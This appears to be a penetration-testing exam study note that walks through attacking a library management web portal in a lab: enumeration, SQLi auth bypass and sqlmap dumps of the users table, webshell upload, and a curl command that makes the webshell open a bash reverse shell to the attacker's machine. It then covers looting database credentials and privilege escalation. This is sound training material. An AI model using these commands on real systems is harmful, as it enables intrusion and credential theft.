# 📚 Scenario 09 — Library Education Portal (attack the app's features)

> **Given:** a standalone serving a functional web app — a *"Library Education"* portal (catalog/login/registration, not a static brochure). Goal: foothold → root/SYSTEM + proof. Unlike [[Scenario 02 — Cloud Web Hosting (brochure page)]] (a decoy page), here you **attack the application directly**. Fill `<placeholders>` from your own run, invent nothing.

Part of [[_MOC (Standalone Scenarios)]]. Method: [[Standalone Boxes — Exam Solve Guide]] · [[Web Enumeration]]. Foothold: [[SQL Injection]] · [[File Upload]] · [[Web Exploitation]] · [[RCE]]. Then: [[Credential Attacks]] · [[Linux Privilege Escalation]] · [[Windows Privilege Escalation]].

```bash
export IP=<TARGET_IP> ; mkdir -p loot
```

---

## 🧠 THE SHAPE OF THIS BOX
A **functional CRUD app** (library/management/education portal) = an app with real inputs: a **login**, a **search/catalog**, **user registration**, and usually a **file upload** (avatars, book covers, documents). These off-the-shelf PHP portals are **Exploit-DB staples** — SQLi and authenticated file-upload RCE are the norm.

> **First move that saves the box:** identify the **exact product + version**. Most "Online Library Management System / Library Portal" apps on sourcecodester/GitHub have a **public PoC** (unauth SQLi or auth file-upload RCE). Matching the product is faster than hand-rolling.

---

## 1️⃣ IDENTIFY THE APP
```bash
sudo nmap -sC -sV -p- $IP -oN nmap/services.txt
whatweb http://$IP/ ; curl -s http://$IP/ | grep -iE 'generator|powered by|<title>|copyright'
feroxbuster -u http://$IP -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,bak,zip,sql
searchsploit library management ; searchsploit <exact_product_name>     # match → PoC
```
Hunt the footer / page title / `/README`/`/CHANGELOG`/`/.git` for the product name and version, and `/admin`, `/login.php`, `/dashboard`, `/uploads/`.

## 2️⃣ FOOTHOLD — match each input to its bug class
| What the app gives you | Attack | Note |
|---|---|---|
| **Login form** | **SQLi auth bypass** (`' or 1=1-- -`), then default/weak creds | [[SQL Injection]] |
| `?id=` / search / catalog | **SQLi** → `sqlmap -u '...' --batch --dump` (users table) | [[SQL Injection]] |
| **Registration → profile pic / book cover upload** | **auth file-upload RCE** → `.php` webshell | [[File Upload]] · [[RCE]] |
| Known product + version | `searchsploit -m <poc>` → run (read it first) | [[Exploitation Methodology]] |
| Admin panel | default creds (`admin:admin`) → upload/exec | [[Credential Attacks]] |
| `?page=`/`?file=` | LFI → log/session poison → RCE | [[Web Exploitation]] |

**Typical chain for these portals:** SQLi dumps the `users` table → crack the admin hash ([[Credential Attacks]]) → log into admin → **file-upload** feature → webshell → shell. Or a single public PoC does auth-bypass+upload in one shot.

```bash
# SQLi dump:
sqlmap -u "http://$IP/<page>.php?id=1" --batch --dbs --dump -T users
# after webshell upload:
curl "http://$IP/uploads/shell.php?c=$(python3 -c 'import urllib.parse;print(urllib.parse.quote("bash -c \"bash -i >& /dev/tcp/<KALI>/443 0>&1\""))')"
# listener: nc -lvnp 443  ([[Shells]])
```

## 3️⃣ FOOTHOLD → PRIVESC
You land as the web user. Loot the app's DB config and reuse everywhere:
```bash
# Linux (LAMP):
id; sudo -l; find / -perm -4000 -type f 2>/dev/null
grep -riE "db_(user|pass)|mysqli?_connect|password" /var/www 2>/dev/null | head   # DB creds → SSH/su
./linpeas.sh | tee loot/linpeas.txt
# Windows: whoami /priv → SeImpersonate → GodPotato/PrintSpoofer → SYSTEM
```
→ [[Linux Privilege Escalation]] / [[Windows Privilege Escalation]]. **The DB password is often a user's system password** — test it for `sudo`/`su`/RDP.

---

## 🗺️ DECISION FLOW
```
Library portal (functional app)
   ▼
identify product + version  (whatweb / footer / searchsploit)
   ├─ public PoC exists ──► run it (auth-bypass / SQLi / upload RCE) ─┐
   ├─ login form ──► SQLi auth-bypass / default creds ────────────────┤
   ├─ ?id=/search ──► sqlmap dump users ──► crack ──► admin ──────────┤
   └─ upload feature ──► webshell ────────────────────────────────────┘
                                                   ▼
                                      web-user shell ──► loot DB config creds
                                                   ▼
                       privesc (sudo -l / SUID  |  SeImpersonate) ──► ROOT/SYSTEM ✅
```

## 🚧 STUCK?
1. Can't find the product → read **page source, JS, `/.git/`, `/uploads/` listing**; try `searchsploit` on every keyword in the footer.
2. SQLi blocked → try the **login** field (not just `?id=`), POST params, and `sqlmap --forms`.
3. Upload rejected → filter-bypass (double ext `.php.jpg`, `.phtml`, content-type, magic bytes) ([[File Upload]]).
4. Have admin but no obvious RCE → look for a **settings/template/import** feature that writes files.
→ [[Standalone Boxes — Exam Solve Guide]] (Stuck section).

## 🧠 ONE-LINE LESSON
**A functional portal is attacked through its own features: identify the exact product (→ Exploit-DB PoC), then hit the login/search with SQLi and the upload with a webshell. Dump+crack the users table or drop a shell, then loot the DB config password and reuse it for privesc.**
